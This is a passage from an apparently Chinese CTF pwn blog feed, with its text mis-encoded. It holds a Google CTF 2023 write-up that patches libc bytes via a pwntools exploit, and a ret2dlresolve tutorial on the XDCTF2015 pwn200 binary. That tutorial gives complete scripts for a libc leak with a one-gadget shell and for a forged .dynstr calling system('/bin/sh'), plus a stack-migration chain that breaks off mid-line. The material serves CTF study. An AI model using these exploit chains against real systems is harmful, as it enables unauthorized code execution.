CODE XREF: write+<span class="number">9B</span>â†“j</span><br><span class="line">.text:<span class="number">0000000000114</span>A77 <span class="number">44</span> <span class="number">89</span> C7                      mov     edi, r8d</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ§åˆ¶fs:18hä¸ä¸º0,ä½†æ˜¯æˆ‘ä»¬åˆä¸èƒ½ç›´æ¥æ§åˆ¶fs:18,æˆ‘ä»¬åªèƒ½å¡«å†™0x43ï¼Œæœ‰äº›ç³»ç»Ÿè°ƒç”¨åœ¨å‡ºé”™è®¾ç½®errnoæ—¶ä¼šæ ¹æ®errnoåœ¨goté‡Œçš„å€¼å°†å‡ºé”™ç å†™å…¥fsbase+*errno_gotçš„ä½ç½®</p><p>æ‰€ä»¥å¯ä»¥æ•…æ„è°ƒç”¨å‡ºé”™æ§åˆ¶fs:0x43ä½ç½®çš„å€¼ä¸ä¸º0ï¼Œç„¶å mov     eax, fs:18hæ”¹ä¸ºmov     eax, fs:43hç»•è¿‡</p><blockquote><p>idaå¯¼å‡ºè¡¨é‡Œæ‰¾åˆ°errnoï¼Œå†ctrl xæ‰¾äº¤å‰å¼•ç”¨å°±å¯ä»¥æ‰¾åˆ°errno gotè¡¨ä½ç½®ä¸º0x218E10</p></blockquote><p>å‚æ•°å°±æ˜¯ä»è¿™é‡Œæ¥çš„<code>.text:0000000000114A64 8B 7C 24 08                   mov     edi, dword ptr [rsp+28h+fd]</code>ä¹Ÿå°±æ˜¯rsp+8çš„ä½ç½®</p><p>æˆ‘ä»¬å¯ä»¥æ”¹ä¸ºrsp+0x43ï¼Œè¿™æ ·å°±å¯ä»¥æå‰ç”¨mainå‡½æ•°é‡Œçš„<code> v7 = read(v8, buf, 0x40uLL);</code>æ¥å¸ƒç½®å¥½å‚æ•°ä¸ºæˆ‘ä»¬æƒ³è¦çš„1337</p><p>ç›´æ¥è´´ä¸€ä¸‹Exå¸ˆå‚…çš„expå§</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;wfw3.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">result = sh.recvuntil(b<span class="number">&#x27;.</span>so<span class="number">&#x27;</span>).split(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">libc_addr = <span class="type">int</span>(result[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + hex(libc_addr))</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>\n\n\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="meta">#errnogotè¡¨é‡Œä¸€èˆ¬æ˜¯0xffffffffffffff80ï¼Œåªèƒ½ä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ä¸ºCï¼Œæ‰€ä»¥å…ˆç”¨0å»å¡«å……</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span><span class="number">-0x70</span>, <span class="number">0x78</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">#è®©closeç³»ç»Ÿè°ƒç”¨å·å˜ä¸º<span class="number">0x43</span>,å³shmdt,å‚æ•°ä¸åˆæ³•ä¼šå¯¼è‡´å‡ºé”™è®¾ç½®errno</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x115110</span>+<span class="number">1</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">#ä¿®æ”¹writeçš„mov     eax, fs:<span class="number">18</span>hä¸ºmov     eax, fs:<span class="number">43</span>h</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A28</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">#æŠŠwriteç¬¬ä¸€ä¸ªå‚æ•°æ”¹ä¸ºesp+<span class="number">0x43</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A67</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (<span class="number">0</span>, <span class="number">0x70</span>)).encode().ljust(<span class="number">0x13</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>) + p32(<span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§è§£æ³•æ˜¯åˆ©ç”¨æŒ‡ä»¤å‰ç¼€0x43æ¥æ“ä½œexitå‡½æ•°</p><blockquote><p>REXå‰ç¼€çš„å€¼ä»‹äº40håˆ°4Fhä¹‹é—´ï¼Œå…·ä½“å–å€¼å–å†³äºæ‰€æœŸæœ›çš„ç‰¹å®šçš„æ‰©å±•å¯„å­˜å™¨çš„ç»„åˆã€‚<strong>ä¸€æ¡æŒ‡ä»¤åªèƒ½æœ‰ä¸€ä¸ªREXå‰ç¼€ï¼Œå¿…é¡»ç´§æ¥åœ¨æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œç å­—èŠ‚ä¹‹å‰ã€‚ REXå‰ç¼€åœ¨å…¶ä»–ä»»ä½•ä½ç½®éƒ½å°†è¢«å¿½ç•¥ã€‚</strong></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000000455F</span>0                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000455F</span>0 F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">00000000000455F</span>4 <span class="number">50</span>                            push    rax</span><br><span class="line">.text:<span class="number">00000000000455F</span>5 <span class="number">58</span>                            pop     rax</span><br><span class="line">.text:<span class="number">00000000000455F</span>6 B9 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     ecx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000000455F</span>B BA <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000045600</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">35</span> <span class="number">31</span> <span class="number">42</span> <span class="number">1</span>D <span class="number">00</span>          lea     rsi, off_219838</span><br><span class="line">.text:<span class="number">0000000000045607</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">08</span>                   sub     rsp, <span class="number">8</span><span class="comment">//å¯ä»¥æ”¹ä¸º 43 83 EC 08    sub r12d, 8</span></span><br><span class="line">.text:<span class="number">000000000004560B</span> E8 <span class="number">80</span> FD FF FF                call    sub_45390</span><br><span class="line">.text:<span class="number">000000000004560B</span>                               ; &#125; <span class="comment">// starts at 455F0//43 80 FD FF    cmp r13b, 0xff</span></span><br><span class="line">                                                         <span class="comment">//æœ€åä¸€ä¸ªffæ”¹ä¸ºæŒ‡ä»¤å‰ç¼€43</span></span><br><span class="line">.text:<span class="number">000000000004560B</span></span><br><span class="line">.text:<span class="number">000000000004560B</span>                               <span class="built_in">exit</span> endp</span><br><span class="line">.text:<span class="number">000000000004560B</span></span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span>                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span>                               public on_exit ; weak</span><br><span class="line">.text:<span class="number">0000000000045610</span>                               on_exit proc near                       ; DATA XREF: LOAD:<span class="number">000000000000B</span>550â†‘o</span><br><span class="line">.text:<span class="number">0000000000045610</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000045610</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64<span class="comment">//43434343</span></span><br><span class="line">.text:<span class="number">0000000000045614</span> <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">0000000000045616</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000045617</span> <span class="number">53</span>                            push    rbp<span class="comment">// push    rbp  push    rbpä»»æ„ä¸€ä¸ªæ”¹ä¸ºæŒ‡ä»¤å‰ç¼€</span></span><br><span class="line">.text:<span class="number">0000000000045618</span> <span class="number">48</span> <span class="number">85</span> FF                      test    rdi, rdi<span class="comment">//434343</span></span><br><span class="line">..........</span><br><span class="line">.text:<span class="number">0000000000045679</span>                               loc_45679:                              ; CODE XREF: on_exit+<span class="number">8</span>Eâ†“j</span><br><span class="line">.text:<span class="number">0000000000045679</span>                                                                       ; on_exit+<span class="number">98</span>â†“j</span><br><span class="line">.text:<span class="number">0000000000045679</span> <span class="number">44</span> <span class="number">89</span> E0                      mov     eax, r12d</span><br><span class="line">.text:<span class="number">000000000004567</span>C <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000004567</span>D <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000004567</span>E <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">0000000000045680</span> C3                            retn</span><br></pre></td></tr></table></figure><p>push    rbp  push    rbpä»»æ„ä¸€ä¸ªæ”¹ä¸ºæŒ‡ä»¤å‰ç¼€éƒ½ä¼šå¯¼è‡´åé¢å¤špopä¸€ä¸ªå‚æ•°ï¼Œretnæ—¶æ­£å¥½æ—¶æˆ‘ä»¬mainå‡½æ•°é‡Œè¾“å…¥bufçš„ä½ç½®ï¼Œå¯ä»¥ç»“åˆåŸºåœ°å€è¿›è¡Œrop</p><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/">http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/</a></p><p><a href="https://zhuanlan.zhihu.com/p/639991243">https://zhuanlan.zhihu.com/p/639991243</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve</title>
      <link href="/2023/07/09/ret2dlresolve/"/>
      <url>/2023/07/09/ret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>è´´ä¸€ä¸‹hollkå¸ˆå‚…åšå®¢é‡Œçš„ä¸€å¼ å›¾ç‰‡ <a href="https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501</a></p><p><img src="/2023/07/09/ret2dlresolve/image-20230711215322463.png" alt="image-20230711215322463"></p><p>_dl_runtime_resolve(link_map_obj, reloc_index),ç¬¬ä¸€ä¸ªlinkmapå³ä¸ºgotè¡¨ç¬¬äºŒé¡¹ï¼Œlinkmapå¯ä»¥æ‰¾åˆ°**.dynamic<strong>çš„ä½ç½®ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå³ä¸ºplté‡Œpushçš„æ•°ï¼Œä¸ºè¦æ‰¾çš„ç¬¦å·çš„é‡å®šä½é¡¹åœ¨</strong>rel.plt**è¡¨é‡Œåç§»ï¼Œrel.plté‡Œæ˜¯Elf32_Relç»“æ„ä½“</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">https://www.cnblogs.com/ZIKH26/articles/15944406.html</a></p><h2 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/no-relro&gt; checksec main_no_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹æœ€ç®€å•åˆ©ç”¨å°±æ˜¯vulnå‡½æ•°çš„æº¢å‡ºå’Œwriteæ³„éœ²libcåŸºåœ°å€ï¼Œç„¶åç”¨onegadgetæ‹¿shell</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">write=elf.plt[b<span class="string">&quot;write&quot;</span>]</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(write)+p32(<span class="number">0x80485AE</span>)+p32(<span class="number">1</span>)+p32(elf.got[b<span class="number">&#x27;</span>write<span class="number">&#x27;</span>])+p32(<span class="number">0x10</span>)</span><br><span class="line">sla(b<span class="number">&#x27;</span>XDCTF2015~!\n<span class="number">&#x27;</span>,payload)</span><br><span class="line">write_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;write_ad&#x27;</span>,write_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_ad)</span><br><span class="line">base=write_ad-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">gadget=base+<span class="number">0x172841</span></span><br><span class="line">db(<span class="string">&#x27;b *0x804851A&#x27;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(gadget)</span><br><span class="line"><span class="meta"># sla(b<span class="string">&#x27;XDCTF2015~!\n&#x27;</span>,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>åŠ¨æ€é“¾æ¥å™¨ä¼šä»<code>.dynamic</code> èŠ‚ä¸­ç´¢å¼•åˆ°å„ä¸ªç›®æ ‡èŠ‚ï¼Œ_dl_runtime_resolveå»¶è¿Ÿè§£æç¬¦å·çš„åœ°å€æ—¶ï¼Œæ˜¯ä¾æ®ç¬¦å·çš„åå­—è¿›è¡Œè§£æçš„</p><p>æˆ‘ä»¬å¯ä»¥æ”¹æ‰.dynstræ¥å®ç°æ§åˆ¶</p><p>.dynamic</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Sword    d_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   Elf32_Word d_val;            <span class="comment">/* Integer value */</span></span><br><span class="line">   Elf32_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line"> &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p><img src="/2023/07/09/ret2dlresolve/image-20230708121848040.png" alt="image-20230708121848040"></p><blockquote><p>å¯ä»¥ç”¨readelf -Sæ‰¾åˆ°dynamicèŠ‚ä½ç½®ï¼Œç„¶åæ ¹æ®dynamicçš„Addrå»idaé‡Œçœ‹ï¼Œidaå·²ç»å¸®æˆ‘ä»¬åˆ†æå¥½äº†ï¼Œä¸çŸ¥é“å„ä½å¸ˆå‚…è¿˜æœ‰æ²¡æœ‰æ›´æ–¹ä¾¿çš„æ–¹æ³•ï¼Œæ±‚å‘ŠçŸ¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readelf -S main_no_relro_32</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al </span><br><span class="line">[<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="/2023/07/09/ret2dlresolve/image-20230708122318087.png" alt="image-20230708122318087"></p></blockquote><p>ä¼ªé€ ä¸€ä¸ªæŠŠreadæ”¹ä¸ºsystemçš„dynstrèŠ‚æ¥æ›¿æ¢åŸæ¥çš„èŠ‚ï¼Œreadå‡½æ•°å·²ç»è¢«è§£ææ”¾åˆ°äº†goté‡Œ(jmp *got)ï¼Œä¸ä¼šèµ°_dl_runtime_resolveï¼Œæ‰€ä»¥è¦è¿”å›åˆ°ä»–pltçš„ç¬¬äºŒæ¡æŒ‡ä»¤</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta"># context.log_level=<span class="string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">p.recvuntil(b<span class="number">&#x27;</span>Welcome to XDCTF2015~!\n<span class="number">&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x08048376&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="meta"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="meta">#get the data of .dynstr section </span></span><br><span class="line">print(b<span class="number">&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">dynstr = dynstr.replace(b&quot;read&quot;,b&quot;system&quot;)#replace the section data </span></span><br><span class="line"><span class="string">print(b&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0+0x100,len(b&quot;/bin/sh\x00&quot;)) # read /bin/sh\x00</span></span><br><span class="line"><span class="string">rop.raw(0x08048376) # the second instruction of read@plt </span></span><br><span class="line"><span class="string">rop.raw(0xdeadbeef)</span></span><br><span class="line"><span class="string">rop.raw(0x080498E0+0x100)</span></span><br><span class="line"><span class="string"># print(rop.dump())</span></span><br><span class="line"><span class="string">assert(len(rop.chain())&lt;=256)</span></span><br><span class="line"><span class="string">rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span></span><br><span class="line"><span class="string">p.send(rop.chain())</span></span><br><span class="line"><span class="string">p.send(p32(0x080498E0))</span></span><br><span class="line"><span class="string">p.send(dynstr)</span></span><br><span class="line"><span class="string"># p.send(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/partial-relro&gt; checksec main_partial_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>.dynamic èŠ‚å°†ä¼šå˜æˆåªè¯»çš„</p><p>æ€è·¯å°±æ˜¯ropåˆ°_dl_runtime_resolve(plt0)å‡½æ•°é…åˆä¼ªé€ çš„rel.plté‡Œçš„Elf32_Relï¼ŒElf32_Relé‡Œçš„r_info&gt;&gt;8æŒ‡å‘ä¼ªé€ çš„.dynsymç¬¦å·è¡¨Elf32_Symçš„ä¸‹æ ‡,Elf32_Symé‡Œçš„st_nameæŒ‡å‘ä¼ªé€ çš„dynstrå­—ç¬¦ä¸²è¡¨çš„åç§»æ¥è°ƒç”¨ä»»æ„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>è¡¨ç¤ºè¦ä¿®æ­£çš„ä½ç½®ç¬¬ä¸€ä¸ªå­—èŠ‚ç›¸å¯¹äºè¿™ä¸ªæ®µçš„åç§»</p><p>r_info ä½8ä½è¡¨ç¤ºè¦é‡å®šä½ç±»å‹ï¼Œé«˜24ä½æ˜¯ç¬¦å·åœ¨ç¬¦å·è¡¨é‡Œçš„ä¸‹æ ‡</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x804853A&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stackæ ˆè¿ç§»</span></span><br><span class="line">bss_ad=elf.bss()</span><br><span class="line">new_stack=bss_ad+<span class="number">0x800</span>+<span class="built_in">int</span>((<span class="number">0x80487c4</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>)*<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;new_stack&#x27;</span>,new_stack)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.read(<span class="number">0</span>,new_stack,<span class="number">100</span>)</span><br><span class="line">rop.migrate(new_stack)</span><br><span class="line">sl(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">#new_stack rop data</span></span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment">#get the .plt address</span></span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynsym&#x27;</span>,dynsym)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynstr&#x27;</span>,dynstr)</span><br><span class="line">p(<span class="string">&#x27;plt&#x27;</span>,plt0)</span><br><span class="line"><span 